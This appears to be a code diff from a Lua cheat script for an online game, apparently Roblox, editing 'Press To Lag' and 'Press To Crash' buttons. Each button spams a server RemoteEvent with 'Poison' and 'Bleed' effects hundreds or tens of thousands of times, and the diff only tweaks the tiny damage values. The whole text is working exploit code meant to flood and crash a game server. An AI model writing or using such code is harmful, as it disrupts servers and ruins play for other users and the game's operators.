@@ -21,8 +21,8 @@ Crasher:AddButton({
 	Name = "Press To Lag",
 	Callback = function()
       		for i = 1, 750 do
-    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 30, TotalDamage = 0.0000000000000000000000000001})
-    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 30, TotalDamage = 0.0000000000000000000000000001})
+    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 30, TotalDamage = 0.0000000000000000000000000000001})
+    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 30, TotalDamage = 0.0000000000000000000000000000001})
 			end
   	end    
 })
@@ -30,8 +30,8 @@ Crasher:AddButton({
 	Name = "Press To Crash",
 	Callback = function()
       		for i = 1, 30000 do
-    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 0.1, TotalDamage = 0.0000000000000000000000000001})
-    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 0.1, TotalDamage = 0.0000000000000000000000000001})
+    		player.Character.RemoteEvent:FireServer("Poison", {Duration = 0.1, TotalDamage = 0.0000000000000000000000000000001})
+    		player.Character.RemoteEvent:FireServer("Bleed", {Duration = 0.1, TotalDamage = 0.0000000000000000000000000000001})
 			end
   	end    
 })
